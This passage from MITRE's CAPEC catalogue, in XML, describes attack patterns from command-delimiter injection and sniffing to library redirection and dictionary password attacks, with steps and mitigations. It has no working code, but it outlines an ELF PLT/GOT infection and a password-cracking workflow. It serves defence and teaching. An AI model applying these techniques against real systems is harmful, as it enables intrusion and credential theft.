               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="15" Name="Command Delimiters" Abstraction="Standard" Status="Draft">
         <Description>An attack of this type exploits a programs' vulnerabilities that allows an attacker's commands to be concatenated onto a legitimate command with the intent of targeting other resources such as the file system or database. The system that uses a filter or a blacklist input validation, as opposed to whitelist validation is vulnerable to an attacker who predicts delimiters (or combinations of delimiters) not present in the filter or blacklist. As with other injection attacks, the attacker uses the command delimiter payload as an entry point to tunnel through the application and activate additional attacks through SQL queries, shell commands, network scanning, and so on.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="137"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Assess Target Runtime Environment] In situations where the runtime environment is not implicitly known, the attacker makes connections to the target system and tries to determine the system's runtime environment. Knowing the environment is vital to choosing the correct delimiters.</Description>
               <Technique>Port mapping using network connection-based software (e.g., nmap, nessus, etc.)</Technique>
               <Technique>Port mapping by exploring the operating system (netstat, sockstat, etc.)</Technique>
               <Technique>TCP/IP Fingerprinting</Technique>
               <Technique>Induce errors to find informative error messages</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Explore</Phase>
               <Description>[Survey the Application] The attacker surveys the target application, possibly as a valid and authenticated user</Description>
               <Technique>Spidering web sites for all available links</Technique>
               <Technique>Inventory all application inputs</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Experiment</Phase>
               <Description>[Attempt delimiters in inputs] The attacker systematically attempts variations of delimiters on known inputs, observing the application's response each time.</Description>
               <Technique>Inject command delimiters using network packet injection tools (netcat, nemesis, etc.)</Technique>
               <Technique>Inject command delimiters using web test frameworks (proxies, TamperData, custom programs, etc.)</Technique>
               <Technique>Enter command delimiters directly in input fields.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>[Use malicious command delimiters] The attacker uses combinations of payload and carefully placed command delimiters to attack the software.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>Software's input validation or filtering must not detect and block presence of additional malicious command.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">The attacker has to identify injection vector, identify the specific commands, and optionally collect the output, i.e. from an interactive session.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Ability to communicate synchronously or asynchronously with server. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Perform whitelist validation against a positive specification for command length, type, and parameters.</Mitigation>
            <Mitigation>Design: Limit program privileges, so if commands circumvent program input validation or filter routines then commands do not running under a privileged account</Mitigation>
            <Mitigation>Implementation: Perform input validation for all remote content.</Mitigation>
            <Mitigation>Implementation: Use type conversions such as JDBC prepared statements.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>By appending special characters, such as a semicolon or other commands that are executed by the target process, the attacker is able to execute a wide variety of malicious commands in the target process space, utilizing the target's inherited permissions, against any resource the host has access to. The possibilities are vast including injection attacks against RDBMS (SQL Injection), directory servers (LDAP Injection), XML documents (XPath and XQuery Injection), and command line shells. In many injection attacks, the results are converted back to strings and displayed to the client process such as a web browser without tripping any security alarms, so the network firewall does not log any out of the ordinary behavior.</xhtml:p>
               <xhtml:p>LDAP servers house critical identity assets such as user, profile, password, and group information that is used to authenticate and authorize users. An attacker that can query the directory at will and execute custom commands against the directory server is literally working with the keys to the kingdom in many enterprises. When user, organizational units, and other directory objects are queried by building the query string directly from user input with no validation, or other conversion, then the attacker has the ability to use any LDAP commands to query, filter, list, and crawl against the LDAP server directly in the same manner as SQL injection gives the ability to the attacker to run SQL commands on the database.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="146"/>
            <Related_Weakness CWE_ID="77"/>
            <Related_Weakness CWE_ID="184"/>
            <Related_Weakness CWE_ID="78"/>
            <Related_Weakness CWE_ID="185"/>
            <Related_Weakness CWE_ID="93"/>
            <Related_Weakness CWE_ID="140"/>
            <Related_Weakness CWE_ID="157"/>
            <Related_Weakness CWE_ID="138"/>
            <Related_Weakness CWE_ID="154"/>
            <Related_Weakness CWE_ID="697"/>
            <Related_Weakness CWE_ID="713"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="150" Name="Collect Data from Common Resource Locations" Abstraction="Standard" Status="Draft">
         <Description>An adversary exploits well-known locations for resources for the purposes of undermining the security of the target. In many, if not most systems, files and resources are organized in a default tree structure. This can be useful for adversaries because they often know where to look for resources or files that are necessary for attacks. Even when the precise location of a targeted resource may not be known, naming conventions may indicate a small area of the target machine's file tree where the resources are typically located. For example, configuration files are normally stored in the /etc director on Unix systems. Adversaries can take advantage of this to commit other types of attacks.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="116"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The targeted applications must either expect files to be located at a specific location or, if the location of the files can be configured by the user, the user either failed to move the files from the default location or placed them in a conventional location for files of the given type.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack. In some cases, the attacker need not even have direct access to the locations on the target computer where the targeted resources reside.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="552"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Description Summary</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Description Summary</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-12-07">Common Resource Location Exploration</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="151" Name="Identity Spoofing" Abstraction="Meta" Status="Stable">
         <Description>Identity Spoofing refers to the action of assuming (i.e., taking on) the identity of some other entity (human or non-human) and then using that identity to accomplish a goal. An adversary may craft messages that appear to come from a different principle or use stolen / spoofed authentication credentials. Alternatively, an adversary may intercept a message from a legitimate sender and attempt to make it look like the message comes from them without changing its content. The latter form of this attack can be used to hijack credentials from legitimate users. Identity Spoofing attacks need not be limited to transmitted messages - any resource that is associated with an identity (for example, a file with a signature) can be the target of an attack where the adversary attempts to change the apparent identity. This attack differs from Content Spoofing attacks where the adversary does not wish to change the apparent identity of the message but instead wishes to change what the message says. In an Identity Spoofing attack, the adversary is attempting to change the identity of the content.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Prerequisites>
            <Prerequisite>The identity associated with the message or resource must be removable or modifiable in an undetectable way.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Authentication</Scope>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Employ robust authentication processes (e.g., multi-factor authentication).</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="287"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="153" Name="Input Data Manipulation" Abstraction="Meta" Status="Draft">
         <Description>An attacker exploits a weakness in input validation by controlling the format, structure, and composition of data to an input-processing interface. By supplying input of a non-standard or unexpected form an attacker can adversely impact the security of the target. For example, using a different character encoding might cause dangerous text to be treated as safe text. Alternatively, the attacker may use certain flags, such as file extensions, to make a target application believe that provided data should be handled using a certain interpreter when the data is not actually of the appropriate type. This can lead to bypassing protection mechanisms, forcing the target to use specific components for input processing, or otherwise causing the user's data to be handled differently than might otherwise be expected. This attack differs from Variable Manipulation in that Variable Manipulation attempts to subvert the target's processing through the value of the input while Input Data Manipulation seeks to control how the input is processed.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Prerequisites>
            <Prerequisite>The target must accept user data for processing and the manner in which this data is processed must depend on some aspect of the format or flags that the attacker can control.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="20"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="154" Name="Resource Location Spoofing" Abstraction="Meta" Status="Stable">
         <Description>An adversary deceives an application or user and convinces them to request a resource from an unintended location. By spoofing the location, the adversary can cause an alternate resource to be used, often one that the adversary controls and can be used to help them achieve their malicious goals.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Prerequisites>
            <Prerequisite>None. All applications rely on file paths and therefore, in theory, they or their resources could be affected by this type of attack.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Authorization</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Monitor network activity to detect any anomalous or unauthorized communication exchanges.</Mitigation>
         </Mitigations>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Description Summary</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Description Summary, Resources_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="155" Name="Screen Temporary Files for Sensitive Information" Abstraction="Detailed" Status="Draft">
         <Description>An adversary exploits the temporary, insecure storage of information by monitoring the content of files used to store temp data during an application's routine execution flow. Many applications use temporary files to accelerate processing or to provide records of state across multiple executions of the application. Sometimes, however, these temporary files may end up storing sensitive information. By screening an application's temporary files, an adversary might be able to discover such sensitive information. For example, web browsers often cache content to accelerate subsequent lookups. If the content contains sensitive information then the adversary could recover this from the web cache.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="150"/>
            <Related_Attack_Pattern Nature="CanFollow" CAPEC_ID="149"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The target application must utilize temporary files and must fail to adequately secure them against other parties reading them.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>Because some application may have a large number of temporary files and/or these temporary files may be very large, an adversary may need tools that help them quickly search these files for sensitive information. If the adversary can simply copy the files to another location and if the speed of the search is not important, the adversary can still perform the attack without any special resources.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="377"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Activation_Zone, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Related_Vulnerabilities, Resources_Required, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="157" Name="Sniffing Attacks" Abstraction="Standard" Status="Draft">
         <Description>In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="117"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The target data stream must be transmitted on a medium to which the adversary has access.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The adversary must be able to intercept the transmissions containing the data of interest. Depending on the medium of transmission and the path the data takes between the sender and recipient, the adversary may require special equipment and/or require that this equipment be placed in specific locations (e.g., a network sniffing tool)</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Encrypt sensitive information when transmitted on insecure mediums to prevent interception.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="311"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Activation_Zone, Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Resources_Required, Solutions_and_Mitigations</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="158" Name="Sniffing Network Traffic" Abstraction="Detailed" Status="Draft">
         <Description>In this attack pattern, the adversary monitors network traffic between nodes of a public or multicast network in an attempt to capture sensitive information at the protocol level. Network sniffing applications can reveal TCP/IP, DNS, Ethernet, and other low-level network communication information. The adversary takes a passive role in this attack pattern and simply observes and analyzes the traffic. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the target information.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="157"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The target must be communicating on a network protocol visible by a network sniffing application.</Prerequisite>
            <Prerequisite>The adversary must obtain a logical position on the network from intercepting target network traffic is possible. Depending on the network topology, traffic sniffing may be simple or challenging. If both the target sender and target recipient are members of a single subnet, the adversary must also be on that subnet in order to see their traffic communication.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Adversaries can obtain and set up open-source network sniffing tools easily.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>A tool with the capability of presenting network communication traffic (e.g., Wireshark, tcpdump, Cain and Abel, etc.).</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Obfuscate network traffic through encryption to prevent its readability by network sniffers.</Mitigation>
            <Mitigation>Employ appropriate levels of segmentation to your network in accordance with best practices.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="311"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1040</Entry_ID>
               <Entry_Name>Network Sniffing</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Description Summary, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Activation_Zone, Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Resources_Required, Solutions_and_Mitigations</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="159" Name="Redirect Access to Libraries" Abstraction="Standard" Status="Stable">
         <Description>An adversary exploits a weakness in the way an application searches for external libraries to manipulate the execution flow to point to an adversary supplied library or code base. This pattern of attack allows the adversary to compromise the application or server via the execution of unauthorized code. An application typically makes calls to functions that are a part of libraries external to the application. These libraries may be part of the operating system or they may be third party libraries. If an adversary can redirect an application's attempts to access these libraries to other libraries that the adversary supplies, the adversary will be able to force the targeted application to execute arbitrary code. This is especially dangerous if the targeted application has enhanced privileges. Access can be redirected through a number of techniques, including the use of symbolic links, search path modification, and relative path manipulation.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="154">
               <Exclude_Related Exclude_ID="403"/>
               <Exclude_Related Exclude_ID="512"/>
               <Exclude_Related Exclude_ID="515"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The target must utilize external libraries and must fail to verify the integrity of these libraries before using them.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">To modify the entries in the configuration file pointing to malicious libraries</Skill>
            <Skill Level="Medium">To force symlink and timing issues for redirecting access to libraries</Skill>
            <Skill Level="High">To reverse engineering the libraries and inject malicious code into the libraries</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Authorization</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Implementation: Restrict the permission to modify the entries in the configuration file.</Mitigation>
            <Mitigation>Implementation: Check the integrity of the dynamically linked libraries before use them.</Mitigation>
            <Mitigation>Implementation: Use obfuscation and other techniques to prevent reverse engineering the libraries.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>In this example, the attacker using ELF infection that redirects the Procedure Linkage Table (PLT) of an executable allowing redirection to be resident outside of the infected executable. The algorithm at the entry point code is as follows... • mark the text segment writeable • save the PLT(GOT) entry • replace the PLT(GOT) entry with the address of the new lib call The algorithm in the new library call is as follows... • do the payload of the new lib call • restore the original PLT(GOT) entry • call the lib call • save the PLT(GOT) entry again (if its changed) • replace the PLT(GOT) entry with the address of the new lib call</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="706"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1034</Entry_ID>
               <Entry_Name>Path Interception</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-29"/>
            <Reference External_Reference_ID="REF-30" Section="Top 10 2007 - Malicious File Execution"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Description, Description Summary, References, Related_Weaknesses</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns, Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="16" Name="Dictionary-based Password Attack" Abstraction="Detailed" Status="Draft">
         <Description>An attacker tries each of the words in a dictionary as passwords to gain access to the system via some user's account. If the password chosen by the user was a word within the dictionary, this attack will be successful (in the absence of other mitigations). This is a specific instance of the password brute forcing attack pattern.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="49"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Determine application's/system's password policy] Determine the password policies of the target application/system.</Description>
               <Technique>Determine minimum and maximum allowed password lengths.</Technique>
               <Technique>Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc., or whether they are allowed to contain words from the dictionary).</Technique>
               <Technique>Determine account lockout policy (a strict account lockout policy will prevent brute force attacks).</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Explore</Phase>
               <Description>[Select dictionaries] Pick the dictionaries to be used in the attack (e.g. different languages, specific terminology, etc.)</Description>
               <Technique>Select dictionary based on particular users' preferred languages.</Technique>
               <Technique>Select dictionary based on the application/system's supported languages.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Explore</Phase>
               <Description>[Determine username(s) to target] Determine username(s) whose passwords to crack.</Description>
               <Technique>Obtain username(s) by sniffing network packets.</Technique>
               <Technique>Obtain username(s) by querying application/system (e.g. if upon a failed login attempt, the system indicates whether the entered username was valid or not)</Technique>
               <Technique>Obtain usernames from filesystem (e.g. list of directories in C:\Documents and Settings\ in Windows, and list in /etc/passwd in UNIX-like systems)</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>[Use dictionary to crack passwords.] Use a password cracking tool that will leverage the dictionary to feed passwords to the system and see if they work.</Description>
               <Technique>Try all words in the dictionary, as well as common misspellings of the words as passwords for the chosen username(s).</Technique>
               <Technique>Try common combinations of words in the dictionary, as well as common misspellings of the combinations as passwords for the chosen username(s).</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The system uses one factor password based authentication.</Prerequisite>
            <Prerequisite>The system does not have a sound password policy that is being enforced.</Prerequisite>
            <Prerequisite>The system does not implement an effective password throttling mechanism.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">A variety of password cracking tools and dictionaries are available to launch this type of an attack.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>A machine with sufficient resources for the job (e.g. CPU, RAM, HD). Applicable dictionaries are required. Also a password cracking tool or a custom script that leverages the dictionary database to launch the attack.</Resource>
         </Resources_Required>
         <Indicators>
            <Indicator>Many invalid login attempts are coming from the same machine (same IP address) or for the same log in name. The login attempts use passwords that are dictionary words.</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Create a strong password policy and ensure that your system enforces this policy.</Mitigation>
            <Mitigation>Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-02.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>A system user selects the word "treacherous" as their passwords believing that it would be very difficult to guess. The password-based dictionary attack is used to crack this password and gain access to the account.</Example>
            <Example>
